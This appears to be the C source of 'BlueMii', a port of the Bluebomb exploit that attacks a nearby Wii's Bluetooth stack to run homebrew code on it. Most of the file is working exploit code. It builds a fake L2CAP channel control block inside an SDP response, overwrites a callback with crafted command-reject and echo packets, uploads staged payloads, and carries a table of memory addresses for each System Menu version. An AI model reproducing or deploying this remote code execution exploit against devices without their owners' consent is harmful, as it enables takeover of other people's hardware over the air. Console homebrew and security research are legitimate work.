#include <stdio.h>
#include <stdlib.h>
#include <gccore.h>
#include <string.h>
#include "stream_macros.h"
#include "stage0/stage0_bin.h"
#include "stage1_bin.h"
#include "lwbt/bluetooth.h"
#include "lwbt/btarch.h"
#include "lwbt/l2cap.h"
#include "lwbt/btpbuf.h"
#include "lwbt/hci.h"
#include <wiiuse/wpad.h>
#include <unistd.h>
#include <ogc/lwp_watchdog.h>

#define SDP_ERROR_RSP				0x01
#define SDP_SERVICE_SEARCH_REQ		0x02
#define SDP_SERVICE_SEARCH_RSP		0x03
#define SDP_SERVICE_ATTR_REQ		0x04
#define SDP_SERVICE_ATTR_RSP		0x05
#define SDP_SERVICE_SEARCH_ATTR_REQ	0x06
#define SDP_SERVICE_SEARCH_ATTR_RSP	0x07

#define ERR_COMPLETE 1

static void *xfb = NULL;
static GXRModeObj *rmode = NULL;

static bool sync_pressed = false;
static err_t bomb_err = ERR_OK;

struct payload_info_t {
	void *payload;
	size_t length;
	size_t remaining;
} payload_info;

static void SyncButton(u32 held)
{
	sync_pressed = true;
}

err_t jump_payload(struct l2cap_pcb *pcb) {
	err_t ret = ERR_OK;
	if ((ret = l2cap_signal(pcb, L2CAP_ECHO_RSP, 1, &(pcb->remote_bdaddr), NULL)) != ERR_OK) {
		fprintf(stderr, "\x1b[38;5;9mjump_payload: Failed to send signal packet (%d)\x1b[0m\n", ret);
		return ret;
	}

	return ERR_COMPLETE;
}

#define PAYLOAD_MTU 1024

err_t upload_payload(struct l2cap_pcb *pcb, struct payload_info_t* payload_info) {
	err_t ret = 0;
	struct pbuf *data;
	
	int packet_size = payload_info->remaining >= PAYLOAD_MTU ? PAYLOAD_MTU : payload_info->remaining % PAYLOAD_MTU;
	if((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
		fprintf(stderr, "\x1b[38;5;9mupload_payload: Could not allocate memory for pbuf\x1b[0m\n");
		return ERR_MEM;
	}

	memcpy(data->payload, payload_info->payload + payload_info->length- payload_info->remaining, packet_size);

	if ((ret = l2cap_signal(pcb, L2CAP_ECHO_RSP, 0, &(pcb->remote_bdaddr), data)) != ERR_OK) {
		fprintf(stderr, "\x1b[38;5;9mupload_payload: Failed to send payload packet (%d)\x1b[0m\n", ret);
		return ret;
	}

	payload_info->remaining -= packet_size;

	printf("\r%d / %d", payload_info->length - payload_info->remaining, payload_info->length);
	fflush(stdout);

	if (payload_info->remaining == 0) {
		return ERR_COMPLETE;
	}

	return ERR_OK;
}

#define PAYLOAD_RESP(a,b) ((u16_t)((a) << 8) | (b))

err_t bluebomb_success2(void *arg, struct l2cap_pcb *pcb, u16_t resp, u8_t id)
{
	if (PAYLOAD_RESP('S','0')) {
		if (upload_payload(pcb, &payload_info) == ERR_COMPLETE) {
			printf("\nJumping to payload!\n");
			l2ca_bluebomb(pcb, NULL);
			bomb_err = jump_payload(pcb);
		}
	}
	
	return ERR_OK;
}

err_t bluebomb_success(void *arg, struct l2cap_pcb *pcb, u16_t resp, u8_t id)
{
	if (PAYLOAD_RESP('S','0')) {
		printf("Got response!\nUploading payload...\n0 / %d", payload_info.length);
		fflush(stdout);
		l2ca_bluebomb(pcb, bluebomb_success2);
		return bluebomb_success2(arg, pcb, resp, id);
	}
	
	return ERR_OK;
}

err_t bluebomb_disconnected_ind(void *arg, struct l2cap_pcb *pcb, err_t err)
{
	l2cap_close(pcb);
	return ERR_OK;
}

err_t do_hax(struct l2cap_pcb *pcb) {
	err_t ret;
	struct pbuf *data;
	
	printf("Overwriting callback in switch case 0x9.\n");
	
	if((data = btpbuf_alloc(PBUF_RAW, L2CAP_CMD_REJ_SIZE+4, PBUF_RAM)) == NULL) {
		fprintf(stderr, "\x1b[38;5;9mdo_hax: Could not allocate memory for pbuf\x1b[0m\n");
		return ERR_MEM;
	}

	((u16_t *)data->payload)[0] = htole16(L2CAP_INVALID_CID);
	((u16_t *)data->payload)[1] = htole16(0x0000); // rcid (from faked ccb)
	((u16_t *)data->payload)[2] = htole16(0x0040 + 0x1f); // lcid

	if ((ret = l2cap_signal(pcb, L2CAP_CMD_REJ, 0, &(pcb->remote_bdaddr), data)) != ERR_OK) {
		fprintf(stderr, "\x1b[38;5;9mdo_hax: Failed to send hax packet (%d)\x1b[0m\n", ret);
		return ret;
	}
	
	printf("Trigger switch statement 0x9.\n");

	if ((ret = l2cap_signal(pcb, L2CAP_ECHO_RSP, 0, &(pcb->remote_bdaddr), NULL)) != ERR_OK) {
		fprintf(stderr, "\x1b[38;5;9mdo_hax: Failed to send trigger packet (%d)\x1b[0m\n", ret);
		return ret;
	}

	return ERR_OK;
}

struct ccb {
	u8_t in_use;
	u32_t chnl_state;
	u32_t p_next_ccb;
	u32_t p_prev_ccb;
	u32_t p_lcb;
	u16_t local_cid;
	u16_t remote_cid;
	// We only go up to the fields we care about, you should still leave the rest blank as there are some fields that should be just left zero after it like the timer object.
};

u32_t L2CB = 0;

err_t send_sdp_service_response(struct l2cap_pcb *pcb,u16_t tid) {
	err_t ret = ERR_OK;
	u8_t *p = NULL;
	u16_t required_size = 1 + 2 + 2 + 2 + 2 + (0x15 * 4) + 1;
	u32_t SDP_CB = L2CB + 0xc00;
	struct pbuf *data = NULL;
	struct ccb fake_ccb = {0};

	printf("Sending SDP service response\n");
	if((data = btpbuf_alloc(PBUF_RAW, required_size, PBUF_RAM)) == NULL) {
		fprintf(stderr, "\x1b[38;5;9msend_sdp_service_response: Could not allocate memory for pbuf\x1b[0m\n");
		return ERR_MEM;
	}

	p = data->payload;
	memset(&fake_ccb, 0x00, sizeof(struct ccb));
	fake_ccb.in_use = 1;
	fake_ccb.chnl_state = htobe32(0x00000002); // CST_TERM_W4_SEC_COMP
	fake_ccb.p_next_ccb = htobe32(SDP_CB + 0x68);
	fake_ccb.p_prev_ccb = htobe32(L2CB + 8 + 0x54 - 8);
	fake_ccb.p_lcb = htobe32(L2CB + 0x8);
	fake_ccb.local_cid = htobe16(0x0000);
	fake_ccb.remote_cid = htobe16(0x0000); // Needs to match the rcid sent in the packet that uses the faked ccb.
	
	UINT8_TO_BE_STREAM(p, SDP_SERVICE_SEARCH_RSP); // SDP_ServiceSearchResponse
	UINT16_TO_BE_STREAM(p, tid); // Transaction ID
	UINT16_TO_BE_STREAM(p, 0x0059); // ParameterLength
	UINT16_TO_BE_STREAM(p, 0x0015); // TotalServiceRecordCount
	UINT16_TO_BE_STREAM(p, 0x0015); // CurrentServiceRecordCount
	memcpy(p + (0xa * 4), &fake_ccb, sizeof(struct ccb)); p += (0x15 * 4); // Embed payload in ServiceRecordHandleList
	UINT8_TO_BE_STREAM(p, 0x00); // ContinuationState

	if ((ret = l2ca_datawrite(pcb,data)) != ERR_OK) {
		fprintf(stderr, "\x1b[38;5;9msend_sdp_service_response: Failed to send SDP service response packet (%d)\x1b[0m\n", ret);
		return ret;
	}

	btpbuf_free(data);

	return ERR_OK;
}

static err_t __bluebomb_receive_dohax(void *arg,struct l2cap_pcb *pcb,struct pbuf *p,err_t err)
{
	err_t ret = ERR_OK;
	printf("Doing hax\n");
	if ((ret = do_hax(pcb)) == ERR_OK) {
		l2ca_bluebomb(pcb, bluebomb_success);
		printf("Awaiting response from stage0\n");
		l2cap_recv(pcb,NULL);
	}
	return ret;
}

// TODO: Figure out the real MTU instead of choosing semi-random numbers
#define SDP_MTU 0xD0

s32 size_remaining = 0;

err_t send_sdp_attribute_response(struct l2cap_pcb *pcb,u16_t tid, void* payload, int len) {
	err_t ret = ERR_OK;

	u8_t *p = NULL;
	struct pbuf *data = NULL;
	
	if (size_remaining == 0) {
		size_remaining = len;
		int payload_size = (size_remaining > SDP_MTU) ? SDP_MTU : size_remaining;
		u16_t packet_size = 1 + 2 + 2 + 2 + 1 + 1 + 1 + 2 + 1 + payload_size + 1;
		printf("Sending SDP attribute response\n");
	
		if((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
			fprintf(stderr, "\x1b[38;5;9msend_sdp_attribute_response: Could not allocate memory for pbuf\x1b[0m\n");
			return ERR_MEM;
		}

		p = data->payload;
		UINT8_TO_BE_STREAM(p, SDP_SERVICE_ATTR_RSP); // SDP_ServiceAttributeResponse
		UINT16_TO_BE_STREAM(p, tid); // Transaction ID
		UINT16_TO_BE_STREAM(p, 2 + 1 + 1 + 1 + 2 + 1 + SDP_MTU + 1); // ParameterLength
		UINT16_TO_BE_STREAM(p, 1 + 1 + 1 + 2 + 1 + SDP_MTU); // AttributeListByteCount
		UINT8_TO_BE_STREAM(p, 0x35); // DATA_ELE_SEQ_DESC_TYPE and SIZE_1
		UINT8_TO_BE_STREAM(p, 0x02); // size of data elements
		UINT8_TO_BE_STREAM(p, 0x09); // u_DESC_TYPE and SIZE_2
		UINT16_TO_BE_STREAM(p, 0xbeef); // The dummy int
		UINT8_TO_BE_STREAM(p, 0x00); // padding so instruction is 0x4 aligned
		memcpy(p, payload, payload_size); p += payload_size; // payload
		UINT8_TO_BE_STREAM(p, size_remaining <= SDP_MTU ? 0x00 : 0x01); // ContinuationState

		if ((ret = l2ca_datawrite(pcb,data)) != ERR_OK) {
			fprintf(stderr, "\x1b[38;5;9msend_sdp_attribute_response: Failed to send SDP attribute response packet (%d)\x1b[0m\n", ret);
			btpbuf_free(data);
			return ret;
		}

		btpbuf_free(data);
		
		size_remaining -= payload_size;

		if (size_remaining <= 0) {
			l2cap_recv(pcb,__bluebomb_receive_dohax);
		}
	} else if (size_remaining > 0) {
		int payload_size = (size_remaining > SDP_MTU) ? SDP_MTU : size_remaining;
		u16_t packet_size = 1 + 2 + 2 + 2 + payload_size + 1;
		if((data = btpbuf_alloc(PBUF_RAW, packet_size, PBUF_RAM)) == NULL) {
			fprintf(stderr, "\x1b[38;5;9msend_sdp_attribute_response: Could not allocate memory for pbuf\n");
			return ERR_MEM;
		}

		p = data->payload;
		// We don't have to care about giving a valid attribute sequence this time so just stick the payload right in.
		UINT8_TO_BE_STREAM(p, 0x05); // SDP_ServiceAttributeResponse
		UINT16_TO_BE_STREAM(p, tid); // Transaction ID
		UINT16_TO_BE_STREAM(p, 2 + SDP_MTU + 1); // ParameterLength
		UINT16_TO_BE_STREAM(p, SDP_MTU); // AttributeListByteCount
		memcpy(p, payload + len - size_remaining, payload_size); p += (payload_size); // payload
		UINT8_TO_BE_STREAM(p, size_remaining <= SDP_MTU ? 0x00 : 0x01); // ContinuationState
		
		if ((ret = l2ca_datawrite(pcb,data)) != ERR_OK) {
			fprintf(stderr, "\x1b[38;5;9msend_sdp_attribute_response: Failed to send SDP attribute response packet (%d)\x1b[0m\n", ret);
			btpbuf_free(data);
			return ret;
		}

		btpbuf_free(data);
		
		size_remaining -= payload_size;

		if (size_remaining <= 0) {
			l2cap_recv(pcb,__bluebomb_receive_dohax);
		}
	}

	return ERR_OK;
}

static err_t __bluebomb_receive(void *arg,struct l2cap_pcb *pcb,struct pbuf *p,err_t err)
{
	err_t ret = ERR_OK;
	if (pcb->psm == SDP_PSM) {
		u8_t hdr = *(u8_t *)p->payload;
		u16_t tid = be16toh(*((u16_t*)((u8_t *)p->payload) + 1));
	
		switch (hdr) {
			case SDP_SERVICE_SEARCH_REQ:
				ret = send_sdp_service_response(pcb, tid);
				break;
			case SDP_SERVICE_ATTR_REQ:
				ret = send_sdp_attribute_response(pcb, tid, stage0_bin, sizeof(stage0_bin));
				break;
		}
	}

	return ret;
}

static err_t __bluebomb_accept_step2(void *arg,struct l2cap_pcb *l2cappcb,err_t err)
{
	struct l2cap_pcb **pcb = (struct l2cap_pcb **)arg;

	printf("Got connection handle: %p\n", l2cappcb);

	if (err == ERR_OK) {
		l2cap_recv(l2cappcb,__bluebomb_receive);
		l2cap_disconnect_ind(l2cappcb,bluebomb_disconnected_ind);
		*pcb = l2cappcb;
	} else {
		l2cap_close(l2cappcb);
	}

	return err;
}

s32 bluebomb_listenasync(struct l2cap_pcb **pcb, struct bd_addr *bdaddr)
{
	u32 level;
	s32 err = ERR_OK;
	struct l2cap_pcb *l2capcb = NULL;

	LOG("bluebomb_listenasync()\n");
	_CPU_ISR_Disable(level);

	if((l2capcb = l2cap_new()) == NULL) {
		err = ERR_MEM;
		goto error;
	}
	l2cap_arg(l2capcb,pcb);

	err = l2cap_connect_ind(l2capcb,bdaddr,SDP_PSM,__bluebomb_accept_step2);
	if(err != ERR_OK) {
		l2cap_close(l2capcb);
	}

error:
	_CPU_ISR_Restore(level);
	LOG("bluebomb_listenasync(%02x)\n",err);
	return err;
}

s32_t bluebomb_accept(s32 result, void *userdata)
{
	err_t ret;
	struct l2cap_pcb **pcb = (struct l2cap_pcb **)userdata;

	printf("Bluebomb ready. Press \x1b[38;5;160mSYNC\x1b[0m on the target console.\n");
	printf("Waiting to accept...\n");

	if((ret = bluebomb_listenasync(pcb, BD_ADDR_ANY)) != ERR_OK) {
		fprintf(stderr, "bluebomb_accept: bluebomb_listenasync failed(%d)", ret);
	}

	return ret;
}

s32_t quitState = 0;

void WiiPowerPressed()
{
    quitState = 2;
}

struct stage0_addr_t {
	char name[32];
	u32_t addr;
};

struct stage0_addr_t stage0_addrs[] = {
	{
		.name = "System Menu 2.0J",
		.addr = 0x81172BC0
	},
	{
		.name = "System Menu 2.0U",
		.addr = 0x81158740
	},
	{
		.name = "System Menu 2.0E",
		.addr = 0x81158580
	},
	{
		.name = "System Menu 2.1E",
		.addr = 0x81158580
	},
	{
		.name = "System Menu 2.2J",
		.addr = 0x81172BC0
	},
	{
		.name = "System Menu 2.2U",
		.addr = 0x81158580
	},
	{
		.name = "System Menu 2.2E",
		.addr = 0x81158580
	},
	{
		.name = "System Menu 3.0J",
		.addr = 0x811893E0
	},
	{
		.name = "System Menu 3.0U",
		.addr = 0x81178CE0
	},
	{
		.name = "System Menu 3.0E",
		.addr = 0x81178CE0
	},
	{
		.name = "System Menu 3.1J",
		.addr = 0x811893E0
	},
	{
		.name = "System Menu 3.1U",
		.addr = 0x81178CE0
	},
	{
		.name = "System Menu 3.1E",
		.addr = 0x81178CE0
	},
	{
		.name = "System Menu 3.2J",
		.addr = 0x811893E0
	},
	{
		.name = "System Menu 3.2U",
		.addr = 0x81178CE0
	},
	{
		.name = "System Menu 3.2E",
		.addr = 0x81178CE0
	},
	{
		.name = "System Menu 3.3J",
		.addr = 0x811893E0
	},
	{
		.name = "System Menu 3.3U",
		.addr = 0x81178CE0
	},
	{
		.name = "System Menu 3.3E",
		.addr = 0x81178CE0
	},
	{
		.name = "System Menu 3.4J",
		.addr = 0x811893E0
	},
	{
		.name = "System Menu 3.4U",
		.addr = 0x811797A0
	},
	{
		.name = "System Menu 3.4E",
		.addr = 0x811797A0
	},
	{
		.name = "System Menu 3.5K",
		.addr = 0x81177B20
	},
	{
		.name = "System Menu 4.0J",
		.addr = 0x81181A20
	},
	{
		.name = "System Menu 4.0U",
		.addr = 0x81171DE0
	},
	{
		.name = "System Menu 4.0E",
		.addr = 0x81171DE0
	},
	{
		.name = "System Menu 4.0K",
		.addr = 0x81170160
	},
	{
		.name = "System Menu 4.1J",
		.addr = 0x81181A20
	},
	{
		.name = "System Menu 4.1U",
		.addr = 0x81171DE0
	},
	{
		.name = "System Menu 4.1E",
		.addr = 0x81171DE0
	},
	{
		.name = "System Menu 4.1K",
		.addr = 0x81170160
	},
	{
		.name = "System Menu 4.2J",
		.addr = 0x81181A20
	},
	{
		.name = "System Menu 4.2U",
		.addr = 0x81171DE0
	},
	{
		.name = "System Menu 4.2E",
		.addr = 0x81171DE0
	},
	{
		.name = "System Menu 4.2K",
		.addr = 0x81170160
	},
	{
		.name = "System Menu 4.3J",
		.addr = 0x81182220
	},
	{
		.name = "System Menu 4.3U",
		.addr = 0x811725E0
	},
	{
		.name = "System Menu 4.3E",
		.addr = 0x811725E0
	},
	{
		.name = "System Menu 4.3K",
		.addr = 0x81170960
	},
	{
		.name = "Wii Mini System Menu (NTSC)",
		.addr = 0x811725E0
	},
	{
		.name = "Wii Mini System Menu (PAL)",
		.addr = 0x81172620
	}
};

#define ARRAY_COUNT(array) (size_t)(sizeof(array) / sizeof((array)[0]))

enum APP_STATE {
	APP_STATE_CHOOSE = 0,
	APP_STATE_CONFIRM,
	APP_STATE_EXPLOIT_INIT,
	APP_STATE_EXPLOIT_RUNNING,
	APP_STATE_EXPLOIT_FINISHED,
	APP_STATE_EXPLOIT_FAILED,
};

void console_set_cursor_pos(int line, int column) {
	printf("\x1b[%d;%dH", line, column);
}

void console_clear_line(int mode) {
	printf("\x1b[%dK", mode);
}

void console_clear_screen(int mode) {
	printf("\x1b[%dJ", mode);
}

int main(int argc, char **argv) {
	struct l2cap_pcb *sdp_pcb = NULL;
	enum APP_STATE state = APP_STATE_CHOOSE;
	u32_t payload_addr = 0;
	s32_t which_addr = 0;

	// Initialise the video system
	VIDEO_Init();

	// Obtain the preferred video mode from the system
	// This will correspond to the settings in the Wii menu
	rmode = VIDEO_GetPreferredMode(NULL);

	// Allocate memory for the display in the uncached region
	xfb = MEM_K0_TO_K1(SYS_AllocateFramebuffer(rmode));

	// Initialise the console, required for printf
	CON_Init(xfb, 20, 20, rmode->fbWidth-20, rmode->xfbHeight-20, rmode->fbWidth*VI_DISPLAY_PIX_SZ);

	// Set up the video registers with the chosen mode
	VIDEO_Configure(rmode);

	// Tell the video hardware where our display memory is
	VIDEO_SetNextFramebuffer(xfb);

	// Clear the framebuffer
	VIDEO_ClearFrameBuffer(rmode, xfb, COLOR_BLACK);

	// Make the display visible
	VIDEO_SetBlack(false);

	// Flush the video register changes to the hardware
	VIDEO_Flush();

	// Wait for Video setup to complete
	VIDEO_WaitVSync();
	if(rmode->viTVMode&VI_NON_INTERLACE) VIDEO_WaitVSync();

	SYS_SetPowerCallback(WiiPowerPressed);

	// This function initialises the attached controllers
	PAD_Init();
	WPAD_Init();

	while(1) 
	{
		PAD_ScanPads();
		WPAD_ScanPads();

		u32_t pad_pressed = PAD_ButtonsDown(0) | PAD_ButtonsDown(1) | PAD_ButtonsDown(2) | PAD_ButtonsDown(3);
		u32_t wpad_pressed = WPAD_ButtonsDown(0) | WPAD_ButtonsDown(1) | WPAD_ButtonsDown(2) | WPAD_ButtonsDown(3);

		switch (state)
		{
			case APP_STATE_CHOOSE:
				console_set_cursor_pos(1, 0);
				printf("\x1b[38;5;39mBlueMii\x1b[0m (Bluebomb v1.5)\n");
				printf("Original exploit/code by \x1b[38;5;123mFullmetal5\x1b[0m, port by \x1b[38;5;99mZarithya\x1b[0m\n\n");
				
				console_clear_line(2);
				printf("Please select your exploit target: <%s>\n", stage0_addrs[which_addr].name);
				if (wpad_pressed & WPAD_BUTTON_RIGHT) {
					if (++which_addr >= ARRAY_COUNT(stage0_addrs))
					which_addr = 0;
				} else if (wpad_pressed & WPAD_BUTTON_LEFT) {
					if (--which_addr < 0)
					which_addr = ARRAY_COUNT(stage0_addrs) - 1;
				} else if (wpad_pressed & WPAD_BUTTON_A) {
					state++;
				}
				break;
			case APP_STATE_CONFIRM:
				console_set_cursor_pos(6, 0);
				printf("Exploit target chosen: %s\n", stage0_addrs[which_addr].name);
				printf("Press \x1b[38;5;10mA\x1b[0m to turn off all connected Wii Remotes and begin the exploit process.\n");
				printf("Press \x1b[38;5;9mB\x1b[0m to go back and choose a different target.\n");

				if (wpad_pressed & WPAD_BUTTON_A) {
					state++;
				} else if (wpad_pressed & WPAD_BUTTON_B) {
					console_set_cursor_pos(6, 0);
					console_clear_screen(0);
					state--;
				}
				break;
			case APP_STATE_EXPLOIT_INIT:
				WPAD_Shutdown();
				console_set_cursor_pos(7, 0);
				console_clear_screen(0);
				console_set_cursor_pos(8, 0);
				printf("Starting Bluebomb for target %s...\n\n", stage0_addrs[which_addr].name);
				L2CB = stage0_addrs[which_addr].addr;
				
				if (L2CB >= 0x81000000) { // System menu
					payload_addr = 0x80004000;
				} else {
					payload_addr = 0x81780000; // 512K before the end of mem 1
				}

				*(u32_t*)(stage0_bin + 0x8) = htobe32(payload_addr);

				payload_info.payload = stage1_bin;
				payload_info.length = sizeof(stage1_bin);
				payload_info.remaining = sizeof(stage1_bin);
		
				BT_Init(bluebomb_accept, &sdp_pcb);
				hci_sync_btn(SyncButton);
				state++;
				break;
			case APP_STATE_EXPLOIT_RUNNING:
				if (bomb_err == ERR_COMPLETE) {
					bomb_err = ERR_OK;
					// Sleep for 100ms to make sure exploit is running on target before we shut down
					usleep(100 * 1000);
					sdp_pcb = NULL;
					BT_Shutdown();
					WPAD_Init();
					state++;
				} else if (bomb_err != ERR_OK) {
					printf("An error occurred: code %d.\n", bomb_err);
					printf("Press \x1b[38;5;10mA\x1b[0m to restart, or press \x1b[38;5;51mHOME\x1b[0m to quit.\n");
					sdp_pcb = NULL;
					BT_Shutdown();
					WPAD_Init();
					state = APP_STATE_EXPLOIT_FAILED;
				}
				break;
			case APP_STATE_EXPLOIT_FINISHED:
				console_set_cursor_pos(24, 0);
				printf("Congrats! Your Wii is now running homebrew.\n");
				printf("...Your other Wii, that is.\n\n");
				printf("Press \x1b[38;5;10mA\x1b[0m to restart, or press \x1b[38;5;51mHOME\x1b[0m to quit.\n");
				state++;
				break;
			case APP_STATE_EXPLOIT_FAILED:
				if (wpad_pressed & WPAD_BUTTON_A) {
					console_clear_screen(2);
					state = APP_STATE_CHOOSE;
				} else if (wpad_pressed & WPAD_BUTTON_HOME) {
					console_set_cursor_pos(6, 0);
					console_clear_screen(0);
					quitState = 1;
				}
				break;
		}

		VIDEO_WaitVSync();

		if (quitState) {
			if (quitState == 2)
				SYS_ResetSystem(SYS_POWEROFF,0,0);
			break;
		}
	}

	WPAD_Shutdown();
	BT_Shutdown();

	printf("On this day, you truly BlueMii.\n");
	sleep(2);

	return 0;
}
